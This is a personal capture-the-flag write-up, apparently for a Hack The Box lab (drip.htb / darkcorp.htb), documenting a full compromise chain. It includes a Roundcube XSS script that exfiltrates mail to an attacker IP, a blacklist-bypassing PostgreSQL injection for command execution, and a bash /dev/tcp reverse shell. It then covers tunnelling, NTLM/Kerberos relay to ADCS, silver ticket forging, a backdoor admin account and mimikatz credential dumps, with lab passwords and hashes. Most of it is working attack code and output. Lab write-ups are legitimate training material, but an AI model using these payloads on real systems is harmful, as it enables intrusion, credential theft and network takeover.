# User flag

## 1. rustscan

```python
PORT   STATE SERVICE REASON          VERSION
22/tcp open  ssh     syn-ack ttl 127 OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 33:41:ed:0a:a5:1a:86:d0:cc:2a:a6:2b:8d:8d:b2:ad (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPM91a70VJCxg10WFerhkQv207077raOCX9rTMPBeEbHqGHO954XaFtpqjoofHOQWi2syh7IoOV5+APBOoJ60k0=
|   256 04:ad:7e:ba:11:0e:e0:fb:d0:80:d3:24:c2:3e:2c:c5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHquJFnMIhX9y8Ea87tDtRWPtxThlpE2Y1WxGzsyvQQM
80/tcp open  http    syn-ack ttl 127 nginx 1.22.1
|_http-favicon: Unknown favicon MD5: B0F964065616CFF6D415A5EDCFA30B97
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
|_http-server-header: nginx/1.22.1
| http-title: DripMail
|_Requested resource was index
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 2. roundcube
=> find this https://www.sonarsource.com/blog/government-emails-at-risk-critical-cross-site-scripting-vulnerability-in-roundcube-webmail/

![[Pasted image 20250421210927.png]]

![[Pasted image 20250421212556.png]]
* try to modify this 
![[Pasted image 20250424092430.png]]
* We can receive the mail, we can use this to send the XSS payload.
![[Pasted image 20250421212616.png]]

**server**
```python
#!/usr/bin/python3

from http.server import BaseHTTPRequestHandler, HTTPServer
from base64 import b64decode, b64encode
from random import randbytes
from urllib.parse import unquote

class RequestHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        return

    def do_GET(self):
        print(self.path)
        base64_data = self.path.split('start=', 1)[-1] if '=' in self.path else ''
        base64_data = unquote(base64_data)

        if base64_data:
            # clear the screen
            #print("\033[H\033[J")
            print(b64encode(randbytes(16)).decode())
            try:
                print(b64decode(base64_data).decode())
            except:
                print("Request Failed")
                print(base64_data)
                return
            with open("./tmp.html", "w") as f:
                f.write(b64decode(base64_data).decode())
        else:
            print(self.path)

        self.send_response(200)
        self.wfile.write(b"Received")

if __name__ == "__main__":
    server_address = ('', 80)
    httpd = HTTPServer(server_address, RequestHandler)
    print("Server running on port 80...")
    httpd.serve_forever()
```

**send mail**
```python
#!/usr/bin/python3

import requests

CONTACT_URL = "http://drip.htb/contact"
LOCAL_IP = "http://10.10.14.51/" # TODO

def send_xss(payload):
    burp0_url = "http://drip.htb:80/contact"
    burp0_headers = {"Cache-Control": "max-age=0", 
                     "Origin": "http://drip.htb", 
                     "Content-Type": "application/x-www-form-urlencoded", 
                     "Accept-Encoding": "gzip, deflate, br", 
                     "Connection": "keep-alive"}
    burp0_data = {"name": "tiffany", 
                  "email": "test@drip.htb", 
                  "message":
                  "<body title=\"bgcolor=foo\" name=\"bar "
                  "style=animation-name:progress-bar-stripes onanimationstart="
                  f"{payload}"
                  " foo=bar\">\r\n  Foo\r\n</body>", 
                  "content": "html", # Don't know why need to switch html 
                  "recipient": "bcase@drip.htb" # Triggered XSS through RoundCube
                  }

    response = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
    return response

send_xss("fetch('http://10.10.14.51/new')")
```

**List mails
```
send_xss("fetch('http://mail.drip.htb/"
         f"?_task=mail&_action=list&_refresh=1&_layout=widescreen&_mbox=INBOX&_page=&_remote=1"
         "').then(response=>response.text()).then(data=>fetch('http://10.10.14.51/?start='+encodeURIComponent(btoa(unescape(encodeURIComponent(data))))));")


=> mails

this.add_message_row(2,{"subject":"Analytics Dashboard","fromto":"<span class=\"adr\"><span title=\"ebelford@drip.htb\" class=\"rcmContactAddress\">ebelford</span></span>","date":"2024-12-24 13:38","size":"1 KB"},{"seen":1,"ctype":"text/plain","mbox":"INBOX"},false);

```

**read mails**
```python
`send_xss("fetch('http://mail.drip.htb"          f"/?_task=mail&_caps=pdf%3D1%2Cflash%3D0%2Ctiff%3D0%2Cwebp%3D1%2Cpgpmime%3D0&_uid=2&_mbox=INBOX&_framed=1&_action=preview"          "').then(response=>response.text()).then(data=>fetch('http://10.10.14.51/?start='+encodeURIComponent(btoa(unescape(encodeURIComponent(data))))));")`

=> the mail

<div id="remote-objects-message" class="notice" style="display: none"><span>To protect your privacy remote resources have been blocked.</span>&nbsp;<span class="boxbuttons"><a href="#loadremote" onclick="rcmail.command('load-remote')">Allow</a></span></div>
</div>
                                <div id="messagebody"><div class="message-part" id="message-part1"><div class="pre">Hey Bryce,<br>
<br>
The Analytics dashboard is now live. While it&#039;s still in development and limited in functionality, it should provide a good starting point for gathering metadata on the users currently using our service.<br>
<br>
You can access the dashboard at dev-a3f1-01.drip.htb. Please note that you&#039;ll need to reset your password before logging in.<br>
<br>
If you encounter any issues or have feedback, let me know so I can address them promptly.<br>
<br>
Thanks<br>
</div></div></div>
                        </div>
                </div>
        </div>
</div>
```

## 3. found another subdomain
```
10.129.77.67    drip.htb mail.drip.htb dev-a3f1-01.drip.htb
```

![[Pasted image 20250422000330.png]]

use xss again to reset the password
![[Pasted image 20250422000356.png]]

```
<br>
You may reset your password here: <a rel="noreferrer" target="_blank" href="http://dev-a3f1-01.drip.htb/reset/ImJjYXNlQGRyaXAuaHRiIg.aAZr_A.pAAUSxMhvgu_5qrvjC85070kMcw">http://dev-a3f1-01.drip.htb/reset/ImJjYXNlQGRyaXAuaHRiIg.aAZr_A.pAAUSxMhvgu_5qrvjC85070kMcw</a><br>
</div>

```

## 4. login to the website

![[Pasted image 20250422000434.png]]

## 5. sql injection
![[Pasted image 20250422003117.png]]
* try with SQLmap
```python
sqlmap -r dev-a3f1-01.analytics.request --cookie="session=.eJwljktqAzEQRO-itRet_qnblxnUUosEQwIz9sr47hEEalO1ePXe5VhnXl_l_jxfeSvH9yz30nt0COVls8pim-LUq_FgzjaEY5Aq96nOPJMramWHRARhCs8F3HIiRTMTMkhZw4CHtMjwGp1MNzZ3xHToWprk-9OMZ3MsW-R15flvU3cd17mO5-8jf_ZAPkWHJAcDQSYCIok3QmpWW1ZV3DJcPn-iKT2J.aAZuxQ.crvrdPq7v_71H9T1pTO7nCruh2k" --dbms=psql --technique='BEUSTQ' --level 5 --risk 1 --tamper=space2comment
```

* find stack base SQLi
![[Pasted image 20250422011426.png]]

```
'test'; select usename FROM pg_user --

'test'; SELECT password FROM "Users" --

'test'; SELECT username,password FROM "Users"--

'test'; select pg_ls_dir('../../../../');

```

* Leak the source code and find the sanitize function
```python
=> 'test' ; select pg_read_file('/var/www/html/dashboard/apps/home/routes.py', 0, 20000)--

from apps.home import blueprint
from flask import render_template, request, flash, redirect
from flask_login import login_required, current_user
from jinja2 import TemplateNotFound
from apps import db, login_manager, session
from flask_mail import Message
from sqlalchemy.exc import InternalError, ProgrammingError, OperationalError
from sqlalchemy import text, exc
import re

@blueprint.route('/')
@login_required
def index():
    return render_template('home/dashboard.html', segment='dashboard')
                           #user_id=current_user.id)

@blueprint.route('/dashboard')
@login_required
def dashboard():
    return render_template('home/dashboard.html', segment='dashboard')
                           #user_id=current_user.id)

@blueprint.route('/analytics', methods=['GET', 'POST'])
@login_required
def analytics():
    if request.method == 'GET':
        user_metadata = db.session.execute(text('SELECT * FROM "Users"')).fetchall()
        return render_template('home/analytics.html', user_metadata=user_metadata)
    
    if request.method == 'POST':
        query = "''" if request.form['query'] == "" else sanitize(request.form['query'])
        try:
            user_metadata = session.execute(text(f'SELECT * FROM "Users" WHERE "Users".username = {query}')).fetchall()
            return render_template('home/analytics.html', user_metadata=user_metadata)
        except InternalError as e:
            flash(f"{e}", 'error') 
        except ProgrammingError as e:
            flash(f"{e}", 'error')        
        except OperationalError as e:			
            flash(f"{e}", 'error')        
            session.rollback()        
        except Exception as e:
            flash(f"{e}", 'error') 

        return redirect('/analytics')
        
        
    return redirect('/analytics')
# Errors

def sanitize(query):
    blacklist = ["create", "insert", "update", "delete", "drop", "copy", "into", "alter", "truncate", "union"]
    pattern = re.compile(r'\b(?:' + '|'.join(blacklist) + r')\b', re.IGNORECASE)
    query = pattern.sub('', query)
    return query

@blueprint.route('/<template>')
@login_required
def route_template(template):

    try:

        if not template.endswith('.html'):
            template += '.html'

        # Detect the current page
        segment = get_segment(request)

        # Serve the file (if exists) from app/templates/home/FILE.html
        return render_template("home/" + template, segment=segment)

    except TemplateNotFound:
        return render_template('home/page-404.html'), 404

    except:
        return render_template('home/page-500.html'), 500


# Helper - Extract current page name from request
def get_segment(request):

    try:

        segment = request.path.split('/')[-1]

        if segment == '':
            segment = 'index'
        return segment

    except:
        return None
```

* find a way to write to file but can't RCE
```
'test' ; select pg_read_file('/var/www/html/dashboard/apps/templates/home/dashboard.html', 0, 20000)--

'test'; SELECT lo_from_bytea(43210, 'your file data goes in here'); SELECT lo_put(43210, 20, 'some other data'); SELECT lo_export(43210, '/tmp/testexport'); 
```

* use base64 encode and execute to bypass the sanitize function
```python
# COPY (SELECT '') to PROGRAM 'sleep 10'
'test'; DO $$ BEGIN EXECUTE convert_from(decode('Q09QWSAoU0VMRUNUICcnKSB0byBQUk9HUkFNICdzbGVlcCAxMCc=', 'base64'), 'UTF8'); END $$;
```

**python script to RCE:**
```python
import requests
import re
import sys
import base64

def extract_spans(html):
    return [match.strip() for match in re.findall(r'<span class="fw-normal">([^<]+)</span>', html) if match.strip()]

def build_payload(path):
    if path.endswith('/'):
        return f"''; select pg_ls_dir('{path}');--"
    else:
        return f"''; select encode(pg_read_binary_file('{path}', 0, 1000000), 'base64'); --"

def main(path):
    session = requests.Session()

    url = "http://dev-a3f1-01.drip.htb/analytics"
    cookies = {
            "session":".eJwljrtuwzAMAP9FcweSkkkqP2OILyQo0AJ2MhX997joeLfc_bS9jjzv7fY8XvnR9ke0W4uFaBXqHFmmAlzKC4wgh1qKdwPlACru2nEB0cwcs6LLKo-uLgOQRsUwTQoWm-IAFssdvC_wkFDjIcVGrjRV1gbpWVDYrpHXmcf_zR_6edT-_P7Mr0sMiPTiRMeEudEVHoUxWDayKok5p2Os9vsG0uhBWg.aAb5gQ.s2-YUUnJW5E_LiUcJx2pFt5ToIc"
    }
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Accept": "text/html",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "http://dev-a3f1-01.drip.htb",
        "Referer": "http://dev-a3f1-01.drip.htb/analytics",
        "Connection": "keep-alive"
    }

    payload = build_payload(path)
    data = {"query": payload}
    response = session.post(url, headers=headers, cookies=cookies, data=data)

    extracted = extract_spans(response.text)

    for val in extracted:
        try:
            decoded = base64.b64decode(val).decode()
            print(decoded)
        except Exception:
            print(val)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python exploit.py \"<remote path>\"")
    else:
        main(sys.argv[1])

```
* Execute
```python

┌──(kali㉿kali)-[~/Downloads]
└─$ echo -n "COPY (SELECT '') to PROGRAM 'ls > /tmp/rce'" | base64
Q09QWSAoU0VMRUNUICcnKSB0byBQUk9HUkFNICdscyA+IC90bXAvcmNlJw==

=> shell
'test'; DO $$ BEGIN EXECUTE convert_from(decode('Q09QWSAoU0VMRUNUICcnKSB0byBQUk9HUkFNICdscyA+IC90bXAvcmNlJw==', 'base64'), 'UTF8'); END $$;


┌──(kali㉿kali)-[~/Desktop/htb]
└─$ python3 test.py /tmp/rce
base
global
pg_commit_ts
pg_dynshmem
pg_logical
pg_multixact
pg_notify
pg_replslot

```
* some test after rce
```python
# True for development, False for production
DEBUG=True

# Flask ENV
FLASK_APP=run.py
FLASK_ENV=development

# If not provided, a random one is generated 
# SECRET_KEY=<YOUR_SUPER_KEY_HERE>

# Used for CDN (in production)
# No Slash at the end
ASSETS_ROOT=/static/assets

# If DB credentials (if NOT provided, or wrong values SQLite is used) 
# DB_ENGINE=mysql
# DB_HOST=localhost
# DB_NAME=appseed_db
# DB_USERNAME=appseed_db_usr
# DB_PASS=pass
# DB_PORT=3306

# LOCAL 5001 Flask
# GITHUB_ID = <YOUR_GITHUB_ID>
# GITHUB_SECRET = <YOUR_GITHUB_SECRET>

#SQLALCHEMY_DATABASE_URI = 'sqlite:///database.db'
SQLALCHEMY_DATABASE_URI = 'postgresql://dripmail_dba:2Qa2SsBkQvsc@localhost/dripmail'
SQLALCHEMY_TRACK_MODIFICATIONS = True
SECRET_KEY = 'GCqtvsJtexx5B7xHNVxVj0y2X0m10jq'
MAIL_SERVER = 'localhost'
MAIL_PORT = 25
MAIL_USE_TLS = False
MAIL_USE_SSL = False
#MAIL_DEBUG = app.debug
MAIL_USERNAME = None
MAIL_PASSWORD = None
DEFAULT_MAIL_SENDER = 'support@dripmail.htb'

# /etc/hosts
127.0.0.1       localhost drip.htb mail.drip.htb dev-a3f1-01.drip.htb

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

172.16.20.1 DC-01 DC-01.darkcorp.htb darkcorp.htb
172.16.20.3 drip.darkcorp.htb
nameserver 172.16.20.1

```

![[Pasted image 20250424095245.png]]
## 6. reverse shell as postgres
```python
shell> /bin/bash -c "bash -i >& /dev/tcp/10.10.14.69/443 0>&1"

┌──(kali㉿kali)-[~/Desktop/htb]
└─$ nc -lvnp 443

# run linpeas 
postgres@drip:/tmp$ bash linpeas.sh

# enum db
postgres@drip:/var/www/html$ psql -U postgres -W -p 5432
psql -U postgres -W -p 5432
Password: 

psql (15.10 (Debian 15.10-0+deb12u1))
Type "help" for help.

postgres=#
```

![[Pasted image 20250424135540.png]]
## 7. gpg decrypt

```python
╔══════════╣ Do I have PGP keys?
/usr/bin/gpg                                                                                    
/var/lib/postgresql/.gnupg/pubring.kbx
--------------------------------------
pub   rsa3072 2025-01-08 [SC] [expires: 2027-01-08]
      3AA1F620319ABF74EF5179C0F426B2D867825D9F
uid           [ultimate] postgres <postgres@drip.darkcorp.htb>
sub   rsa3072 2025-01-08 [E] [expires: 2027-01-08]

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg                                                                                    
/var/lib/postgresql/.gnupg/pubring.kbx
--------------------------------------
pub   rsa3072 2025-01-08 [SC] [expires: 2027-01-08]
      3AA1F620319ABF74EF5179C0F426B2D867825D9F
uid           [ultimate] postgres <postgres@drip.darkcorp.htb>
sub   rsa3072 2025-01-08 [E] [expires: 2027-01-08]

-rw------- 1 postgres postgres 1280 Jan  8 15:02 /var/lib/postgresql/.gnupg/trustdb.gpg

drwx------ 4 postgres postgres 4096 Apr 23 19:46 /var/lib/postgresql/.gnupg

# gpg decrypt
gpg --passphrase=2Qa2SsBkQvsc --pinentry-mode=loopback --decrypt /var/backups/postgres/dev-dripmail.old.sql.gpg

<snip>
COPY public."Admins" (id, username, password, email) FROM stdin;
1       bcase   dc5484871bc95c4eab58032884be7225        bcase@drip.htb
2   victor.r    cac1c7b0e7008d67b6db40c03e76b9c0    victor.r@drip.htb
3   ebelford    8bbd7f88841b4223ae63c8848969be86    ebelford@drip.htb


┌──(kali㉿kali)-[~/Desktop/htb]
└─$ hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt --username --show
victor.r:cac1c7b0e7008d67b6db40c03e76b9c0:victor1gustavo@#
ebelford:8969be86:ThePlague61780
```

## 8. ssh as ebelford and pivoting 

```python
# pivoting using ligolo
$ > sudo ip tuntap add user kali mode tun ligolo
$ > sudo ip link set ligolo up
$ > sudo ip route add 172.16.20.0/24 dev ligolo
$ > ip a

ebelford@drip:~$ ./agent -connect 10.10.14.69:11601 -ignore-cert
WARN[0000] warning, certificate validation disabled     
INFO[0000] Connection established                        addr="10.10.14.69:11601"

┌──(kali㉿kali)-[~/Tools/scripts]
└─$ sudo ./proxy --selfcert          
                                                                  
ligolo-ng » INFO[0151] Agent joined.                                 id=3e63bcc4-2462-4bf7-b5dc-8c9f3976c265 name=ebelford@drip remote="10.129.123.230:62710"                                         
ligolo-ng » session 
? Specify a session : 1 - ebelford@drip - 10.129.123.230:62710 - 3e63bcc4-2462-4bf7-b5dc-8c9f3976c265
[Agent : ebelford@drip] » start

#  pivoting with chisel
postgres@drip:/tmp$ ./chisel client 10.10.14.69:8888 R:socks
./chisel client 10.10.14.69:8888 R:socks
2025/04/21 23:39:48 client: Connecting to ws://10.10.14.69:8888
2025/04/21 23:39:50 client: Connected (Latency 230.1665ms)

┌──(kali㉿kali)-[~/Tools/scripts]
└─$ ./chisel server --reverse -p 8888      
2025/04/22 01:36:56 server: Reverse tunnelling enabled
2025/04/22 01:36:56 server: Fingerprint zjw1O2o1eWQVHxfSW8LffHq5IV9fCIRt2upiqxd3vg4=
2025/04/22 01:36:56 server: Listening on http://0.0.0.0:8888
2025/04/22 01:37:28 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

## 9. touch DC
```python
┌──(kali㉿kali)-[~/Downloads]
└─$ pc cme smb 172.16.20.1         
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.1:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.1:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.1:135  ...  OK
SMB         172.16.20.1     445    DC-01            [*] Windows 10.0 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:False)

# users
┌──(kali㉿kali)-[~/Tools/scripts]
└─$ cme smb 172.16.20.1 -u 'victor.r' -p victor1gustavo@# --users

SMB         172.16.20.1     445    DC-01            darkcorp.htb\Administrator                  Built-in account for administering the computer/domain                                                                                                                        
SMB         172.16.20.1     445    DC-01            darkcorp.htb\Guest                          Built-in account for guest access to the computer/domain                                                                                                                      
SMB         172.16.20.1     445    DC-01            darkcorp.htb\krbtgt                         Key Distribution Center Service Account
SMB         172.16.20.1     445    DC-01            darkcorp.htb\victor.r                       
SMB         172.16.20.1     445    DC-01            darkcorp.htb\svc_acc                        
SMB         172.16.20.1     445    DC-01            darkcorp.htb\john.w                         
SMB         172.16.20.1     445    DC-01            darkcorp.htb\angela.w                       
SMB         172.16.20.1     445    DC-01            darkcorp.htb\angela.w.adm                   
SMB         172.16.20.1     445    DC-01            darkcorp.htb\taylor.b                       
SMB         172.16.20.1     445    DC-01            darkcorp.htb\taylor.b.adm                   
SMB         172.16.20.1     445    DC-01            darkcorp.htb\eugene.b                       
SMB         172.16.20.1     445    DC-01            darkcorp.htb\bryce.c 


┌──(kali㉿kali)-[~/Desktop/htb]
└─$ sudo proxychains4 nmap -sT -F 172.16.20.1 

172.16.20.1 Not shown: 91 closed tcp ports (conn-refused) PORT STATE SERVICE REASON 

22/tcp open ssh syn-ack 
53/tcp open domain syn-ack 
80/tcp open http syn-ack 
88/tcp open kerberos-sec syn-ack 
135/tcp open msrpc syn-ack 
139/tcp open netbios-ssn syn-ack 
389/tcp open ldap syn-ack 
443/tcp open https syn-ack 
445/tcp open microsoft-ds syn-ack
```
## 10. new computer found

```python
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ pc GetADComputers.py -dc-ip 172.16.20.1 "darkcorp.htb/victor.r":victor1gustavo@#
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
/usr/local/bin/GetADComputers.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.13.0.dev0+20250109.91705.ac02e0ee', 'GetADComputers.py')
Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.20.1:389  ...  OK
[*] Querying 172.16.20.1 for information about domain.
SAM AcctName     DNS Hostname                         OS Version       OS                   
---------------  -----------------------------------  ---------------  --------------------
DC-01$           DC-01.darkcorp.htb                   10.0 (20348)     Windows Server 2022 Standard 
DRIP$            drip.darkcorp.htb                                     pc-linux-gnu         
WEB-01$          WEB-01.darkcorp.htb                  10.0 (20348)     Windows Server 2022 Datacenter

┌──(kali㉿kali)-[~/Tools/scripts]
└─$ pc nslookup -vc   # force tcp

> server 172.16.20.1
Default server: 172.16.20.1
Address: 172.16.20.1#53
> web-01.darkcorp.htb
Server:         172.16.20.1
Address:        172.16.20.1#53

Name:   web-01.darkcorp.htb
Address: 172.16.20.2
```

## 11. port scan `web-01`

```python
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ sudo proxychains4 nmap -sT -F 172.16.20.2

PORT STATE SERVICE

80/tcp open http 135/tcp open msrpc 
139/tcp open netbios-ssn 
445/tcp open microsoft-ds 
5000/tcp open upnp
```

## 12. Check port `5000`

![[Pasted image 20250424115036.png]]

![[Pasted image 20250424115147.png]]

![[Pasted image 20250424115239.png]]

* try to get the request

```python
ebelford@drip:~$ ./chisel client 10.10.14.69:8888 0.0.0.0:8080:10.10.14.69:80

2025/04/23 21:55:27 client: Connecting to ws://10.10.14.69:8888                
2025/04/23 21:55:27 client: tun: proxy#8080=>10.10.14.69:80: Listening         
2025/04/23 21:55:28 client: Connected (Latency 197.835ms)

┌──(kali㉿kali)-[~/Desktop/htb]
└─$ python3 -m http.server 80           
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.14.69 - - [23/Apr/2025 23:58:50] "GET / HTTP/1.1" 200 -

```

![[Pasted image 20250424115906.png]]

```python
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ ntlmrelayx.py  -t "ldap://172.16.20.1" --no-acl -smb2support --no-da

[*] Servers started, waiting for connections
[*] HTTPD(80): Client requested path: /
[*] HTTPD(80): Client requested path: /
[*] HTTPD(80): Client requested path: /
[*] HTTPD(80): Connection from 10.10.14.69 controlled, attacking target ldap://172.16.20.1
[*] HTTPD(80): Client requested path: /
[*] HTTPD(80): Authenticating against ldap://172.16.20.1 as DARKCORP/SVC_ACC SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] Dumping domain info for first time
[*] Domain info dumped into lootdir!

==> check what can SVC_ACC do
```

![[Pasted image 20250424121100.png]]
==> attack this : https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx

```python
# https://dc-01.darkcorp.htb/certsrv/certfnsh.asp
HTTP/2 401 Unauthorized

Content-Type: text/html
Server: Microsoft-IIS/10.0
Www-Authenticate: Negotiate                       <--- kerberos
X-Powered-By: ASP.NET
Date: Sat, 26 Apr 2025 02:52:12 GMT
Content-Length: 1293


┌──(kali㉿kali)-[~/Desktop/htb/dump]
└─$ ntlmrelayx.py -t "ldap://172.16.20.1" --add-dns-record 'dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' 10.10.14.69

[*] Checking if domain already has a `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA` DNS record
[*] Domain does not have a `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA` record!
[*] Adding `A` record `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA` pointing to `10.10.14.69` at `DC=dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA,DC=darkcorp.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=darkcorp,DC=htb`
[*] Added `A` record `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA`. DON'T FORGET TO CLEANUP (set `dNSTombstoned` to `TRUE`, set `dnsRecord` to a NULL byte)

┌──(kali㉿kali)-[~/Tools/windows/PetitPotam]
└─$ python3 ./PetitPotam.py -u victor.r -p 'victor1gustavo@#' -d darkcorp.htb 'dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' 172.16.20.2

┌──(kali㉿kali)-[~/Tools/windows/krbrelayx]
└─$ python3 krbrelayx.py -dc-ip 172.16.20.1 --adcs --template Machine -v "WEB-01$" -t "https://dc-01.darkcorp.htb/certsrv/certfnsh.asp"

[*] SMBD: Received connection from 10.129.123.230
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE! ID 5
[*] Writing PKCS#12 certificate to ./WEB-01$.pfx


┌──(.krbrelayx)─(kali㉿kali)-[~/Tools/windows/krbrelayx]
└─$ certipy auth -pfx WEB-01\$.pfx 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: web-01$@darkcorp.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'web-01.ccache'
[*] Trying to retrieve NT hash for 'web-01$'
[*] Got hash for 'web-01$@darkcorp.htb': aad3b435b51404eeaad3b435b51404ee:8f33c7fc7ff515c1f358e488fbb8b675
```

## 13. silver ticket
```python
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ ticketer.py -nthash 8f33c7fc7ff515c1f358e488fbb8b675 -domain-sid S-1-5-21-3432610366-2163336488-3604236847 -domain darkcorp.htb -spn cifs/WEB-01.darkcorp.htb Administrator

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for darkcorp.htb/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache


┌──(kali㉿kali)-[~/Desktop/htb]
└─$ wmiexec.py -k -no-pass WEB-01.darkcorp.htb

C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is E2B2-45D5

 Directory of C:\Users\Administrator\Desktop

01/22/2025  05:24 AM    <DIR>          .
02/03/2025  02:21 PM    <DIR>          ..
04/23/2025  06:15 PM                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   7,950,888,960 bytes free
```

# root flag

## 1. Add a new user for us
```python
C:\>net user null pa$$w0rd /add
The command completed successfully.


C:\>net localgroup Administrator null /add
System error 1376 has occurred.

The specified local group does not exist.


C:\>net localgroup Administrators null /add
The command completed successfully.

┌──(kali㉿kali)-[~/Desktop/htb]
└─$ evil-winrm -i 172.16.20.2 -u 'null' -p 'pa$$w0rd'
```
## 2. dpapi

```python
*Evil-WinRM* PS C:\Users\Administrator\AppData\Local\Microsoft\Credentials> gci -Force


    Directory: C:\Users\Administrator\AppData\Local\Microsoft\Credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-         1/16/2025  11:01 AM            560 32B2774DF751FF7E28E78AE75C237A1E

type C:\Users\Administrator\AppData\Local\Microsoft\Credentials\32B2774DF751FF7E28E78AE75C237A1E


mimikatz # dpapi::cred /in:"C:\Users\Administrator\AppData\Local\Microsoft\Credentials\32B2774DF751FF7E28E78AE75C237A1E"

guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
dwMasterKeyVersion : 00000001 - 1
guidMasterKey      : {6037d071-cac5-481e-9e08-c4296c0a7ff7}


*Evil-WinRM* PS C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-2988385993-1727309239-2541228647-500> gci -Force


    Directory: C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-2988385993-1727309239-2541228647-500


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-         1/15/2025   4:11 PM            468 189c6409-5515-4114-81d2-6dde4d6912ce
-a-hs-         1/16/2025  10:35 AM            468 6037d071-cac5-481e-9e08-c4296c0a7ff7
-a-hs-         4/23/2025   6:18 PM            468 62d5d5b2-c545-4ed7-85eb-2d529f8cede5
-a-hs-         4/23/2025   6:18 PM             24 Preferred 



*Evil-WinRM* PS C:\Users\null> ./m.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "token::elevate" "lsadump::sam" "lsadump::secrets" "lsadump::cache" "vault::cred /patch" "exit"

mimikatz(commandline) # vault::cred /patch
TargetName : WEB-01 / <NULL>
UserName   : Administrator
Comment    : Updated by: SYSTEM on: 4/23/2025
Type       : 1 - generic
Persist    : 2 - local_machine
Flags      : 00000000
Credential : Pack_Beneath_Solid9!
Attributes : 0

TargetName : LegacyGeneric:target=WEB-01 / <NULL>
UserName   : Administrator
Comment    : Updated by: SYSTEM on: 4/23/2025
Type       : 1 - generic
Persist    : 2 - local_machine
Flags      : 00000000
Credential : Pack_Beneath_Solid9!
Attributes : 0

TargetName : Domain:batch=TaskScheduler:Task:{7D87899F-85ED-49EC-B9C3-8249D246D1D6} / <NULL>
UserName   : WEB-01\Administrator
Comment    : <NULL>
Type       : 2 - domain_password
Persist    : 2 - local_machine
Flags      : 00004004
Credential : But_Lying_Aid9!
Attributes : 0

mimikatz # lsadump::sam
Domain : WEB-01
SysKey : 4cf6d0e998d53752d088e233abb4bed6
Local SID : S-1-5-21-2988385993-1727309239-2541228647

SAMKey : 06ec26b0dde27ae449d2814b85a29e71

RID  : 000001f4 (500)
User : Administrator
Hash NTLM: 88d84ec08dad123eb04a060a74053f21


mimikatz # vault::cred /patch


mimikatz # dpapi::cred /in:"C:\Users\Administrator\AppData\Local\Microsoft\Credentials\32B2774DF751FF7E28E78AE75C237A1E"

UnkData        : (null)
Comment        : Updated by: Administrator on: 1/16/2025
TargetAlias    : (null)
UserName       : Administrator
CredentialBlob : Pack_Beneath_Solid9!
Attributes     : 0

